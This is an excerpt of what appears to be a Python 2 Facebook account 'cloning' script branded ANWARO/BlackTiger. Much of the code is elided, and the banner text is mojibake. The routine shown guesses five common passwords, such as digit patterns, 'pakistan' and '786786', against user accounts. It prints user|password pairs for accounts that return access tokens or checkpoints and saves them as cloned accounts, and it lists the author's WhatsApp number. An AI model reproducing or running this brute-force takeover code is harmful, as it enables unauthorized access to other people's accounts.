...
def tik():
	...
	for o in titik:
		...
		print("\r\x1b[1;93mANWAROâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
...
▒█▄▄▀ ▒█▄▄▄ ▒█░▒█ ▒█▄▄▀
 ...
 \033[1;96m          \x1b[1;93mWHATSAPP Number ANWARO +923498940903
...
def action():
    ...
    jalan ("\033[1;95mANWAROâ total 5 password will clone ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â 11 digit , last 7 digit, pakistan, 000786, 786786 password Start Cracking...")
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    print '\033[1;92m(ANWARO_CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            print '\033[1;92m(ANWARO_CP) ' + k + c + user + '  |  ' + pass2
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    print '\033[1;92m(ANWARO_CP) ' + k + c + user + '  |  ' + pass3 
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            ...
                                            print '\033[1;92m(ANWARO_CP) ' + k + c + user + '  |  ' + pass4
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    ...
                                                    print '\033[1;92m(ANWARO_CP) ' + k + c + user + '  |  ' + pass5 
    ...
    print 'ANWARO TRICKER Process Has Been Completedâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’...100%'

    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))

    print('BlackTiger Cloned Accounts Has Been Saved : save/cloned.txt')

    jalan("Note : Your ANWARO(CP)Accounts Open after 7 to 10 days")
...
\033[1;91mThanks \033[1;97mUseing My ANWARKHAN Tool
